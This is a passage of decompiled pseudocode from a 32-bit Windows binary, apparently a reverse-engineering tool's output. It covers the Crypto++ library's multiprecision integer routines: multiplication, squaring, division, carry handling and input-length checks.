      + ((a2[6] * a2[5] + v50) >> 31)
      + 2 * ((a2[6] * (unsigned __int64)a2[5] + (unsigned int)v50) >> 32)
      + HIDWORD(v51);
  a1[11] = v51;
  v53 = 2 * a2[7] * a2[5] + a2[6] * (unsigned __int64)a2[6];
  HIDWORD(v65) = v53 + v52;
  v54 = (HIDWORD(v53) + ((v52 + (unsigned int)v53) >> 32)) >> 32;
  v55 = HIDWORD(v53) + ((v52 + (unsigned int)v53) >> 32);
  LODWORD(v53) = 2 * ((a2[7] * (unsigned __int64)a2[5]) >> 32) + ((a2[7] * a2[5]) >> 31) + v55;
  v57 = 2 * ((a2[7] * (unsigned __int64)a2[5]) >> 32) + ((a2[7] * a2[5]) >> 31) + __PAIR64__(v54, v55);
  a1[12] = HIDWORD(v65);
  v58 = a2[7] * (unsigned __int64)a2[6];
  v59 = __CFADD__(2 * v58, (_DWORD)v53) + HIDWORD(v57);
  a1[13] = 2 * v58 + v53;
  result = a1;
  v61 = ((unsigned int)v58 >> 31) + 2i64 * HIDWORD(v58) + a2[7] * (unsigned __int64)a2[7];
  a1[14] = v59 + v61;
  a1[15] = __CFADD__(v59, (_DWORD)v61) + HIDWORD(v61);
  return result;
}

//----- (00410F9E) --------------------------------------------------------
unsigned int __thiscall sub_410F9E(int *this)
{
  int v1; // edi
  int v2; // eax

  v1 = this[4];
  v2 = sub_4113F2(v1, this[3]);
  if ( v2 )
    return 32 * v2 + sub_40A926((_DWORD *)(v1 - 4 + 4 * v2)) - 32;
  else
    return 0;
}

//----- (00410FD0) --------------------------------------------------------
unsigned int __thiscall sub_410FD0(int *this)
{
  int v1; // edi
  int v2; // eax

  v1 = this[4];
  v2 = sub_4113F2(v1, this[3]);
  if ( v2 )
    return sub_40E398((_DWORD *)(v1 - 4 + 4 * v2)) + 4 * v2 - 4;
  else
    return 0;
}

//----- (00411000) --------------------------------------------------------
void *__thiscall sub_411000(_DWORD *this, void *a2, int *a3, int *a4, int *a5, int *a6)
{
  int v7; // edi
  int *v8; // esi
  int *v9; // eax
  int v10; // eax
  int v12[31]; // [esp+10h] [ebp-88h] BYREF
  int v13; // [esp+94h] [ebp-4h]
  int vars0; // [esp+98h] [ebp+0h] BYREF
  char vars4; // [esp+9Ch] [ebp+4h] BYREF
  int vars18; // [esp+B0h] [ebp+18h] BYREF
  char vars1C; // [esp+B4h] [ebp+1Ch] BYREF
  char vars30; // [esp+C8h] [ebp+30h] BYREF
  char vars34; // [esp+CCh] [ebp+34h] BYREF
  int vars48; // [esp+E0h] [ebp+48h]

  vars48 = 0;
  v7 = (int)(this + 3);
  if ( sub_411C2A(this + 3, 0) == 1 )
  {
    sub_40EA62((int)v12, v7);
    v13 = 0;
    v8 = sub_4112E3(v12, &vars0, a5);
    LOBYTE(v13) = 1;
    v9 = sub_4112E3(v12, &vars18, a3);
    LOBYTE(v13) = 2;
    v10 = sub_4110E5(v12, (int)&vars30, v9, a4, v8, a6);
    LOBYTE(v13) = 3;
    sub_41134B(v12, a2, v10);
    sub_40891D((int)&vars34);
    sub_40891D((int)&vars1C);
    sub_40891D((int)&vars4);
    sub_40EC4B(v12);
  }
  else
  {
    sub_425C00(this, (int)a2, a3, a4, a5, a6);
  }
  return a2;
}
// 411000: using guessed type int var_88[31];

//----- (004110E5) --------------------------------------------------------
int __thiscall sub_4110E5(void *this, int a2, void *a3, int *a4, int *a5, int *a6)
{
  sub_425C00(this, a2, a3, a4, a5, a6);
  return a2;
}

//----- (0041110A) --------------------------------------------------------
int __thiscall sub_41110A(_DWORD **this, int a2, int a3, int a4, int a5, int a6)
{
  (*(void (__thiscall **)(_DWORD *, int, int, int, int, int, _DWORD))(*this[1] + 80))(this[1], a2, a3, a4, a5, a6, 0);
  return a2;
}

//----- (00411132) --------------------------------------------------------
void __cdecl sub_411132(unsigned int a1)
{
  int pExceptionObject[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD Src[10]; // [esp+38h] [ebp-28h] BYREF

  if ( a1 > 0x3FFFFFFF )
  {
    sub_40AAE3((int)Src, "AllocatorBase: requested size would cause integer overflow");
    Src[9] = 0;
    sub_406307(pExceptionObject, 1, Src);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (00411181) --------------------------------------------------------
void __thiscall sub_411181(int this, unsigned int a2)
{
  char *v3; // eax
  int v4; // edx

  if ( a2 > *(_DWORD *)(this + 8) )
  {
    v3 = (char *)sub_40E4FF(this, *(void **)(this + 12), *(_DWORD *)(this + 8), a2, 1);
    v4 = *(_DWORD *)(this + 8);
    *(_DWORD *)(this + 12) = v3;
    memset(&v3[4 * v4], 0, 4 * (a2 - v4));
    *(_DWORD *)(this + 8) = a2;
  }
  *(_DWORD *)(this + 4) = 0x3FFFFFFF;
}

//----- (004111C8) --------------------------------------------------------
void *__thiscall sub_4111C8(int this, int a2)
{
  void *result; // eax

  result = sub_4128B8(this, a2);
  if ( *(_DWORD *)(this + 12) )
    result = memset(*(void **)(this + 12), 0, 4 * *(_DWORD *)(this + 8));
  *(_DWORD *)(this + 4) = 0x3FFFFFFF;
  return result;
}

//----- (004111F9) --------------------------------------------------------
_DWORD *__thiscall sub_4111F9(void *this)
{
  _DWORD *v2; // ecx
  _DWORD *result; // eax

  v2 = operator new(0x54u);
  result = 0;
  if ( v2 )
    return sub_40E96D(v2, (int)this);
  return result;
}

//----- (00411229) --------------------------------------------------------
_DWORD *__thiscall sub_411229(void *this)
{
  _DWORD *v2; // ecx
  _DWORD *result; // eax

  v2 = operator new(0x7Cu);
  result = 0;
  if ( v2 )
    return sub_40EA18(v2, (int)this);
  return result;
}

//----- (00411259) --------------------------------------------------------
int __cdecl sub_411259(int a1, int a2, int a3)
{
  int v3; // ecx
  int v4; // esi
  _DWORD *v5; // edx

  v3 = a3;
  if ( !a3 )
    return 0;
  v4 = a1 - a2;
  v5 = (_DWORD *)(a2 + 4 * a3);
  while ( 1 )
  {
    --v5;
    --v3;
    if ( *(_DWORD *)((char *)v5 + v4) > *v5 )
      break;
    if ( *(_DWORD *)((char *)v5 + v4) < *v5 )
      return -1;
    if ( !v3 )
      return 0;
  }
  return 1;
}

//----- (0041128E) --------------------------------------------------------
int __thiscall sub_41128E(int *this, int a2)
{
  if ( this[5] == 1 )
  {
    if ( *(_DWORD *)(a2 + 20) == 1 )
      return -sub_412A4E(this, a2);
    else
      return -1;
  }
  else if ( *(_DWORD *)(a2 + 20) == 1 )
  {
    return 1;
  }
  else
  {
    return sub_412A4E(this, a2);
  }
}

//----- (004112C0) --------------------------------------------------------
int *__thiscall sub_4112C0(int *this, int *a2, int *a3)
{
  sub_40EEA2(a2, a3, this + 3);
  return a2;
}

//----- (004112E3) --------------------------------------------------------
int *__thiscall sub_4112E3(int *this, int *a2, int *a3)
{
  int v4; // eax
  int *v5; // eax
  char v7[4]; // [esp+10h] [ebp-28h] BYREF
  char v8[20]; // [esp+14h] [ebp-24h] BYREF
  int v9; // [esp+28h] [ebp-10h]
  int v10; // [esp+34h] [ebp-4h]

  v4 = this[6];
  v9 = 0;
  v5 = (int *)sub_40ECC6(a3, v7, 32 * v4);
  v10 = 0;
  sub_40EEA2(a2, v5, this + 3);
  sub_40891D((int)v8);
  return a2;
}
// 4112E3: using guessed type char var_28[4];
// 4112E3: using guessed type char var_24[20];

//----- (0041132F) --------------------------------------------------------
void *__stdcall sub_41132F(void *a1, int *a2)
{
  sub_40E80A(a1, a2);
  return a1;
}

//----- (0041134B) --------------------------------------------------------
void *__thiscall sub_41134B(int *this, void *a2, int a3)
{
  char *v4; // ebp
  int v5; // edi
  int v6; // eax
  void *Destination; // [esp+14h] [ebp-8h]

  v4 = (char *)this[30];
  v5 = this[6];
  Destination = (void *)this[13];
  sub_4113D1(v4, *(void **)(a3 + 16), *(_DWORD *)(a3 + 12));
  v6 = *(_DWORD *)(a3 + 12);
  if ( 2 * v5 != v6 )
    memset(&v4[4 * v6], 0, 4 * (2 * v5 - v6));
  sub_4122FF(Destination, (int)&v4[8 * v5], (int)v4, this[7], this[25], v5);
  sub_40E80A(a2, this + 9);
  return a2;
}

//----- (004113D1) --------------------------------------------------------
errno_t __cdecl sub_4113D1(void *Destination, void *Source, int a3)
{
  errno_t result; // eax

  if ( Destination != Source )
    return memcpy_s(Destination, 4 * a3, Source, 4 * a3);
  return result;
}

//----- (004113F2) --------------------------------------------------------
int __cdecl sub_4113F2(int a1, int a2)
{
  int v2; // ecx
  _DWORD *v3; // eax

  v2 = a2;
  if ( a2 )
  {
    v3 = (_DWORD *)(a1 + 4 * a2 - 4);
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v2;
    }
    while ( v2 );
  }
  return v2;
}

//----- (00411414) --------------------------------------------------------
void __thiscall sub_411414(int *this, int a2)
{
  unsigned int v3; // eax
  char v4[60]; // [esp+10h] [ebp-40h] BYREF
  int v5; // [esp+4Ch] [ebp-4h]

  sub_40ABBB((int)v4, a2, 2);
  v5 = 0;
  v3 = sub_412045(this, 1);
  sub_411AB7(this, (int)v4, v3, 1u);
  sub_40B6EB((int)v4);
  sub_40ACD8((int)v4);
}

//----- (00411463) --------------------------------------------------------
unsigned int __thiscall sub_411463(int this, int a2, unsigned int a3, int a4)
{
  int v5; // esi
  unsigned __int64 v6; // rax
  unsigned int v7; // edi
  unsigned __int8 v8; // dl
  BOOL v9; // eax
  BOOL v10; // eax
  int v11; // eax
  unsigned int result; // eax
  unsigned __int8 v13; // [esp+1Bh] [ebp-51h] BYREF
  int pExceptionObject[10]; // [esp+1Ch] [ebp-50h] BYREF
  _DWORD Src[10]; // [esp+44h] [ebp-28h] BYREF

  v5 = a2;
  LODWORD(v6) = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 60))(a2);
  v7 = a3;
  if ( v6 < a3 )
  {
    sub_40AAE3((int)Src, "Integer: input length is too small");
    Src[9] = 0;
    sub_406307(pExceptionObject, 1, Src);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  (*(void (__thiscall **)(int, unsigned __int8 *))(*(_DWORD *)a2 + 80))(a2, &v13);
  v8 = v13;
  v9 = a4 == 1 && (v13 & 0x80u) != 0;
  *(_DWORD *)(this + 20) = v9;
  if ( a3 )
  {
    while ( 1 )
    {
      v10 = v8 == 0xFF;
      if ( !*(_DWORD *)(this + 20) )
        v10 = v8 == 0;
      if ( !v10 )
        break;
      (*(void (__thiscall **)(int, int, _DWORD))(*(_DWORD *)a2 + 84))(a2, 1, 0);
      (*(void (__thiscall **)(int, unsigned __int8 *))(*(_DWORD *)a2 + 80))(a2, &v13);
      if ( !--v7 )
        break;
      v8 = v13;
    }
    a3 = v7;
  }
  v11 = sub_413329((v7 + 3) >> 2);
  result = (unsigned int)sub_4111C8(this + 4, v11);
  if ( v7 )
  {
    do
    {
      (*(void (__thiscall **)(int, unsigned __int8 *))(*(_DWORD *)v5 + 72))(v5, &v13);
      result = v13 << (8 * (--v7 & 3));
      *(_DWORD *)(*(_DWORD *)(this + 16) + 4 * (v7 >> 2)) |= result;
      v5 = a2;
    }
    while ( v7 );
    v7 = a3;
  }
  if ( *(_DWORD *)(this + 20) == 1 )
  {
    while ( v7 < 4 * *(_DWORD *)(this + 12) )
    {
      *(_DWORD *)(*(_DWORD *)(this + 16) + 4 * (v7 >> 2)) |= 255 << (8 * (v7 & 3));
      ++v7;
    }
    return sub_41C57A(*(unsigned int **)(this + 16), *(_DWORD *)(this + 12));
  }
  return result;
}
// 411489: variable 'v6' is possibly undefined
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (004115B0) --------------------------------------------------------
unsigned int __thiscall sub_4115B0(void *this, void *Src, size_t Size, int a4)
{
  _DWORD v6[8]; // [esp+8h] [ebp-24h] BYREF

  sub_40EB3C(v6, Src, Size);
  return sub_411463((int)this, (int)v6, Size, a4);
}
// 4115B0: using guessed type _DWORD var_24[8];

//----- (004115F5) --------------------------------------------------------
int __cdecl sub_4115F5(unsigned int *a1, unsigned int a2, int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // eax
  int v6; // edx
  unsigned int v7; // ecx

  v3 = *a1;
  v4 = *a1 - a3;
  *a1 = v4;
  if ( v4 <= v3 )
    return 0;
  v6 = 1;
  if ( a2 > 1 )
  {
    while ( 1 )
    {
      v7 = a1[v6];
      a1[v6] = v7 - 1;
      if ( v7 )
        break;
      if ( ++v6 >= a2 )
        return 1;
    }
    return 0;
  }
  return 1;
}

//----- (0041162E) --------------------------------------------------------
int __thiscall sub_41162E(void *this, int *a2, int *a3)
{
  int *v4; // eax
  int v5; // esi
  int v7; // [esp+10h] [ebp-24h] BYREF
  char v8[28]; // [esp+14h] [ebp-20h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  v4 = sub_40EE85(&v7, a2, a3);
  v9 = 0;
  v5 = sub_40EC6C((int)this + 36, v4);
  sub_40891D((int)v8);
  return v5;
}
// 41162E: using guessed type char var_20[28];

//----- (0041166F) --------------------------------------------------------
int __cdecl sub_41166F(void *Destination, int a2, _DWORD *a3, void *a4, char *a5, _DWORD *Source, unsigned int a7)
{
  int v7; // ebp
  _DWORD *v10; // edx
  BOOL v11; // ebx
  unsigned int v12; // ebx
  char *v13; // ecx
  unsigned int *v14; // ebx
  unsigned int v15; // ecx
  bool v16; // zf
  unsigned int v17; // ecx
  unsigned int v18; // ebp
  unsigned int v19; // ecx
  char *v21; // [esp+14h] [ebp-38h]
  char *v22; // [esp+18h] [ebp-34h]
  unsigned int v23[2]; // [esp+1Ch] [ebp-30h] BYREF
  unsigned int v24[2]; // [esp+24h] [ebp-28h] BYREF
  unsigned int v25[2]; // [esp+2Ch] [ebp-20h] BYREF
  int v26[2]; // [esp+34h] [ebp-18h] BYREF
  unsigned int v27[4]; // [esp+3Ch] [ebp-10h] BYREF
  unsigned int *v28; // [esp+58h] [ebp+Ch]
  unsigned int v29; // [esp+60h] [ebp+14h]
  unsigned int *v30; // [esp+60h] [ebp+14h]
  void *Sourcea; // [esp+64h] [ebp+18h]
  _DWORD *v32; // [esp+68h] [ebp+1Ch]
  int v33; // [esp+68h] [ebp+1Ch]

  v7 = (int)a5;
  v29 = (unsigned int)(a5 + 2);
  v10 = &a3[v29];
  v11 = Source[a7 - 1] == 0;
  v28 = &a3[a7 + v29];
  v10[a7 - 1] = 0;
  *v10 = 0;
  v32 = &v10[a7 - 1];
  sub_4113D1(&v10[v11], Source, a7 - v11);
  Sourcea = (void *)(32 - sub_40A926(v32));
  sub_41C142((int)&a3[v29], a7, (int)Sourcea);
  a3[v7 + 1] = 0;
  a3[v7] = 0;
  *a3 = 0;
  v22 = (char *)&a3[v11];
  sub_4113D1(v22, a4, v7);
  sub_41C142((int)a3, v29, (int)Sourcea);
  if ( *(_QWORD *)&a3[v7] <= 1ui64 )
  {
    v12 = v7 - a7;
    *(_DWORD *)(a2 + 4 * v12) = 0;
    *(_DWORD *)(a2 + 4 * v12 + 4) = 0;
    while ( 1 )
    {
      v13 = (char *)&a3[v12];
      if ( !a3[v7] )
      {
        if ( sub_411259((int)&a3[v12], (int)&a3[v29], a7) < 0 )
          goto LABEL_8;
        v13 = (char *)&a3[v12];
      }
      a3[v7] -= off_48C068(a7, v13, v13, &a3[v29]);
      ++*(_DWORD *)(a2 + 4 * v12);
    }
  }
  v7 = v29;
LABEL_8:
  v14 = &a3[v29];
  v15 = v14[a7 - 2];
  v16 = v15 == -1;
  v17 = v15 + 1;
  v18 = v7 - 2;
  if ( v18 >= a7 )
  {
    v23[1] = v14[a7 - 1] + v16;
    v23[0] = v17;
    v30 = (unsigned int *)(a2 + 4 * (v18 - a7));
    v21 = (char *)a3 - a2;
    do
    {
      v19 = a3[v18 + 1];
      v24[0] = a3[v18];
      v25[0] = a3[v18 - 2];
      v24[1] = v19;
      v25[1] = a3[v18 - 1];
      sub_40E3CF(v26, v27, v25, v24, v23);
      *v30 = v26[0];
      v30[1] = v26[1];
      sub_40F52D(v28, (int)&v28[a7 + 2], v30, 2u, v14, a7);
      v33 = (int)v30 + (_DWORD)v21;
      off_48C068(a7 + 2, (char *)v30 + (_DWORD)v21, (char *)v30 + (_DWORD)v21, v28);
      while ( a3[v18] || sub_411259(v33, (int)v14, a7) >= 0 )
      {
        a3[v18] -= off_48C068(a7, v33, v33, v14);
        v16 = (*v30)++ == -1;
        v30[1] += v16;
      }
      v30 -= 2;
      v18 -= 2;
    }
    while ( v18 >= a7 );
  }
  sub_4113D1(Destination, v22, a7);
  return sub_41C1C2((int)Destination, a7, (int)Sourcea);
}
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);
// 41166F: using guessed type unsigned int var_10[4];

//----- (004118C4) --------------------------------------------------------
char __cdecl sub_4118C4(int *a1, int *a2, int *a3, int *a4)
{
  _DWORD *v4; // eax
  int *v5; // eax
  char result; // al
  int v7; // [esp+10h] [ebp-3Ch] BYREF
  char v8[20]; // [esp+14h] [ebp-38h] BYREF
  int v9; // [esp+28h] [ebp-24h] BYREF
  char v10[28]; // [esp+2Ch] [ebp-20h] BYREF
  int v11; // [esp+48h] [ebp-4h]

  sub_412A91((int)a1, (int)a2, a3, (int)a4);
  if ( a3[5] == 1 )
  {
    sub_4128A1(a2);
    if ( !sub_40ED09(a1) )
    {
      sub_40ED4C(a2);
      v4 = sub_40F11C(a4, &v7);
      v11 = 0;
      v5 = sub_40EDC8(&v9, v4, (int)a1);
      LOBYTE(v11) = 1;
      sub_40EC6C((int)a1, v5);
      sub_40891D((int)v10);
      sub_40891D((int)v8);
    }
  }
  result = (char)a4;
  if ( a4[5] == 1 )
    return sub_4128A1(a2);
  return result;
}
// 4118C4: using guessed type char var_20[28];
// 4118C4: using guessed type char var_38[20];

//----- (0041195B) --------------------------------------------------------
int __thiscall sub_41195B(int *this, int a2, int a3)
{
  int v4; // esi
  int v5; // eax

  v4 = *this;
  v5 = (*(int (__thiscall **)(int *, int))(*this + 64))(this, a3);
  return (*(int (__thiscall **)(int *, int, int))(v4 + 60))(this, a2, v5);
}

//----- (00411977) --------------------------------------------------------
errno_t __cdecl sub_411977(_BYTE *Destination, void *Source, int a3, int a4, int a5)
{
  errno_t result; // eax
  int i; // ebx
  int v7; // esi

  result = sub_4113D1(Destination, Source, a5);
  for ( i = a3; i; --i )
  {
    if ( (*Destination & 1) != 0 )
    {
      v7 = off_48C064(Destination, a4);
      result = sub_41C1C2((int)Destination, a5, 1);
      *(_DWORD *)&Destination[4 * a5 - 4] += v7 << 31;
    }
    else
    {
      result = sub_41C1C2((int)Destination, a5, 1);
    }
  }
  return result;
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);

//----- (004119DA) --------------------------------------------------------
int *__thiscall sub_4119DA(int *this, int *a2, int *a3)
{
  int v5; // [esp+10h] [ebp-28h] BYREF
  char v6[20]; // [esp+14h] [ebp-24h] BYREF
  int v7; // [esp+28h] [ebp-10h]
  int v8; // [esp+34h] [ebp-4h]

  v8 = 0;
  v7 = 0;
  sub_40E940(&v5);
  v8 = 1;
  sub_40E940(a2);
  v7 = 1;
  sub_4118C4(&v5, a2, this, a3);
  sub_40891D((int)v6);
  return a2;
}
// 4119DA: using guessed type char var_24[20];

//----- (00411A2F) --------------------------------------------------------
char __stdcall sub_411A2F(int *a1, int *a2, int *a3, int *a4)
{
  return sub_4118C4(a1, a2, a3, a4);
}

//----- (00411A4A) --------------------------------------------------------
int __thiscall sub_411A4A(void *this, _DWORD *a2)
{
  int *v3; // eax
  int v4; // esi
  int v6; // [esp+10h] [ebp-24h] BYREF
  char v7[28]; // [esp+14h] [ebp-20h] BYREF
  int v8; // [esp+30h] [ebp-4h]

  v3 = sub_411A9D(a2, &v6);
  v8 = 0;
  v4 = sub_40EC6C((int)this + 36, v3);
  sub_40891D((int)v7);
  return v4;
}
// 411A4A: using guessed type char var_20[28];

//----- (00411A85) --------------------------------------------------------
int __thiscall sub_411A85(void *this, int a2)
{
  return (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a2, a2);
}

//----- (00411A95) --------------------------------------------------------
int __thiscall sub_411A95(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 68))(this[1]);
}

//----- (00411A9D) --------------------------------------------------------
_DWORD *__thiscall sub_411A9D(_DWORD *this, _DWORD *a2)
{
  sub_4128F1(this, a2, (unsigned int)this);
  return a2;
}

//----- (00411AB7) --------------------------------------------------------
void __thiscall sub_411AB7(int *this, int a2, unsigned int a3, unsigned int a4)
{
  unsigned int v5; // eax
  unsigned int *v6; // ecx
  _DWORD *v7; // eax
  unsigned int v8; // esi
  int v9; // [esp+10h] [ebp-3Ch] BYREF
  char v10[20]; // [esp+14h] [ebp-38h] BYREF
  int v11; // [esp+28h] [ebp-24h] BYREF
  char v12[28]; // [esp+2Ch] [ebp-20h] BYREF
  int v13; // [esp+48h] [ebp-4h]

  if ( a4 && this[5] == 1 )
  {
    v5 = sub_410FD0(this);
    v6 = &a3;
    a4 = v5;
    if ( v5 >= a3 )
      v6 = &a4;
    v7 = sub_412D4C(&v9, 8 * *v6);
    v13 = 0;
    sub_40EE07(&v11, v7, (unsigned int)this);
    LOBYTE(v13) = 2;
    sub_40891D((int)v10);
    sub_411AB7(a2, a3, 0);
    sub_40891D((int)v12);
  }
  else
  {
    v8 = a3;
    while ( v8 )
    {
      LOBYTE(a3) = sub_411C4F(this, --v8);
      (*(void (__thiscall **)(int, unsigned int *, int, _DWORD, int))(*(_DWORD *)a2 + 20))(a2, &a3, 1, 0, 1);
    }
  }
}
// 411AB7: using guessed type char var_38[20];
// 411AB7: using guessed type char var_20[28];

//----- (00411B5F) --------------------------------------------------------
void __thiscall sub_411B5F(int *this, int a2, unsigned int a3, unsigned int a4)
{
  _DWORD v5[12]; // [esp+10h] [ebp-30h] BYREF

  sub_40C08D(v5, a2, a3);
  v5[11] = 0;
  sub_411AB7(this, (int)v5, a3, a4);
}

//----- (00411B98) --------------------------------------------------------
bool __stdcall sub_411B98(int *a1, int a2)
{
  return sub_41128E(a1, a2) == 0;
}

//----- (00411BAE) --------------------------------------------------------
int __thiscall sub_411BAE(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 4))(this[1]);
}

//----- (00411BB6) --------------------------------------------------------
int __cdecl sub_411BB6(int a1, int a2)
{
  int v2; // ecx
  _DWORD *v3; // eax

  v2 = a2;
  if ( a2 )
  {
    v3 = (_DWORD *)(a1 + 4 * a2 - 4);
    do
    {
      if ( *(v3 - 1) )
        break;
      if ( *v3 )
        break;
      v3 -= 2;
      v2 -= 2;
    }
    while ( v2 );
  }
  return v2;
}

//----- (00411BDF) --------------------------------------------------------
void *__cdecl sub_411BDF(void *a1, int a2, int a3)
{
  int *v3; // eax
  int v4; // edx
  int *v5; // eax
  int v7[4]; // [esp+10h] [ebp-4Ch] BYREF
  char v8[24]; // [esp+20h] [ebp-3Ch] BYREF
  char v9[20]; // [esp+38h] [ebp-24h] BYREF
  int v10; // [esp+4Ch] [ebp-10h]
  int v11; // [esp+58h] [ebp-4h]

  v10 = 0;
  v3 = sub_40E637(v7);
  v4 = *v3;
  v11 = 0;
  v5 = (int *)(*(int (__thiscall **)(int *, int, int))(v4 + 100))(v3, a2, a3);
  sub_40E80A(a1, v5);
  sub_40891D((int)v9);
  sub_40891D((int)v8);
  return a1;
}
// 411BDF: using guessed type int var_4C[4];
// 411BDF: using guessed type char var_24[20];
// 411BDF: using guessed type char var_3C[24];

//----- (00411C2A) --------------------------------------------------------
char __thiscall sub_411C2A(_DWORD *this, unsigned int a2)
{
  int v2; // eax

  if ( a2 >> 5 >= this[3] )
    LOBYTE(v2) = 0;
  else
    return (*(_DWORD *)(this[4] + 4 * (a2 >> 5)) >> (a2 & 0x1F)) & 1;
  return v2;
}

//----- (00411C4F) --------------------------------------------------------
char __thiscall sub_411C4F(_DWORD *this, unsigned int a2)
{
  int v2; // eax

  if ( a2 >> 2 >= this[3] )
    LOBYTE(v2) = 0;
  else
    return *(_DWORD *)(this[4] + 4 * (a2 >> 2)) >> (8 * (a2 & 3));
  return v2;
}

//----- (00411C74) --------------------------------------------------------
char sub_411C74()
{
  if ( !byte_491D08 )
    sub_4254E3();
  return byte_491D09;
}
// 491D08: using guessed type char byte_491D08;
// 491D09: using guessed type char byte_491D09;

//----- (00411C8D) --------------------------------------------------------
int __thiscall sub_411C8D(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 56))(this[1]);
}

//----- (00411C95) --------------------------------------------------------
int __cdecl sub_411C95(unsigned int *a1, unsigned int a2, int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // eax
  int v6; // eax

  v3 = *a1;
  v4 = *a1 + a3;
  *a1 = v4;
  if ( v4 >= v3 )
    return 0;
  v6 = 1;
  if ( a2 > 1 )
  {
    while ( a1[v6]++ == -1 )
    {
      if ( ++v6 >= a2 )
        return 1;
    }
    return 0;
  }
  return 1;
}

//----- (00411CC4) --------------------------------------------------------
int __thiscall sub_411CC4(void *this, int *a2)
{
  int *v3; // eax
  int v4; // esi
  char v6[4]; // [esp+10h] [ebp-24h] BYREF
  char v7[28]; // [esp+14h] [ebp-20h] BYREF
  int v8; // [esp+30h] [ebp-4h]

  v3 = (int *)sub_40EDE5(a2, v6);
  v8 = 0;
  v4 = sub_40EC6C((int)this + 36, v3);
  sub_40891D((int)v7);
  return v4;
}
// 411CC4: using guessed type char var_24[4];
// 411CC4: using guessed type char var_20[28];

//----- (00411CFF) --------------------------------------------------------
int *__thiscall sub_411CFF(int this, int *a2)
{
  if ( sub_40ED09(a2) )
    return a2;
  sub_4113D1(*(void **)(this + 52), *(void **)(this + 28), *(_DWORD *)(this + 24));
  if ( off_48C068(a2[3], *(_DWORD *)(this + 52), *(_DWORD *)(this + 52), a2[4]) )
    sub_4115F5((unsigned int *)(*(_DWORD *)(this + 52) + 4 * a2[3]), *(_DWORD *)(this + 24) - a2[3], 1);
  return (int *)(this + 36);
}
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00411D5D) --------------------------------------------------------
int __thiscall sub_411D5D(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 64))(this[1]);
}

//----- (00411D65) --------------------------------------------------------
void *__thiscall sub_411D65(int this, void *a2, int a3)
{
  char *v4; // ecx
  _DWORD *v5; // eax
  int *v6; // eax
  int *v7; // eax
  int *v8; // eax
  _DWORD *v9; // eax
  int *v10; // eax
  int *v11; // eax
  char v12; // bl
  char v13; // bl
  char *v14; // eax
  int v16; // [esp-4h] [ebp-68h]
  unsigned int v17; // [esp-4h] [ebp-68h]
  int v18; // [esp-4h] [ebp-68h]
  char v19[4]; // [esp+10h] [ebp-54h] BYREF
  char v20[20]; // [esp+14h] [ebp-50h] BYREF
  int v21; // [esp+28h] [ebp-3Ch] BYREF
  char v22[20]; // [esp+2Ch] [ebp-38h] BYREF
  int v23; // [esp+40h] [ebp-24h] BYREF
  char v24[20]; // [esp+44h] [ebp-20h] BYREF
  int v25; // [esp+60h] [ebp-4h]
  int vars0; // [esp+64h] [ebp+0h] BYREF
  char vars4; // [esp+68h] [ebp+4h] BYREF
  int vars18; // [esp+7Ch] [ebp+18h] BYREF
  char vars1C; // [esp+80h] [ebp+1Ch] BYREF
  int vars30; // [esp+94h] [ebp+30h] BYREF
  char vars34[12]; // [esp+98h] [ebp+34h] BYREF
  void *Destination; // [esp+A4h] [ebp+40h]
  int vars48; // [esp+ACh] [ebp+48h] BYREF
  char vars4C; // [esp+B0h] [ebp+4Ch] BYREF
  void *vars50[4]; // [esp+B4h] [ebp+50h] BYREF
  int vars60; // [esp+C4h] [ebp+60h]

  vars60 = 0;
  if ( *(_DWORD *)(this + 20) != 1 )
  {
    if ( sub_411C2A((_DWORD *)a3, 0) )
    {
      sub_40E6D3(vars50, 4 * *(_DWORD *)(a3 + 12));
      v17 = *(_DWORD *)(a3 + 12);
      v25 = 10;
      sub_40E7BF(&vars30, 0, v17);
      v18 = *(_DWORD *)(a3 + 12);
      LOBYTE(v25) = 11;
      v14 = sub_40F2D8(
              Destination,
              (char *)vars50[3],
              *(void **)(this + 16),
              *(_DWORD *)(this + 12),
              *(void **)(a3 + 16),
              v18);
      sub_411977(Destination, Destination, (int)v14, *(_DWORD *)(a3 + 16), *(_DWORD *)(a3 + 12));
      sub_40E80A(a2, &vars30);
      sub_40891D((int)vars34);
      sub_40EBD5(vars50);
      return a2;
    }
    if ( sub_40ED09((int *)a3) || !sub_411C2A((_DWORD *)this, 0) )
    {
      v6 = sub_41C5B0();
    }
    else
    {
      v5 = sub_4128E4();
      if ( sub_41128E((int *)this, (int)v5) )
      {
        sub_4121D5((int *)a3, &vars48, (int *)this);
        v25 = 3;
        sub_411D65(&vars30, this);
        sub_40891D((int)&vars4C);
        if ( sub_40ED09(&vars30) )
        {
          v7 = sub_41C5B0();
          v8 = (int *)sub_40E80A(v19, v7);
          LOBYTE(v25) = 4;
          v16 = 2;
        }
        else
        {
          sub_40E85C(&vars48, 1);
          v25 = 5;
          vars60 = 4;
          v9 = sub_40EDC8(&v21, (_DWORD *)this, (int)&vars30);
          v25 = 6;
          vars60 = 12;
          v10 = sub_40ED2F(&v23, (void *)a3, (int)v9);
          v25 = 7;
          vars60 = 28;
          v11 = sub_40EE07(&vars0, v10, (unsigned int)&vars48);
          v25 = 8;
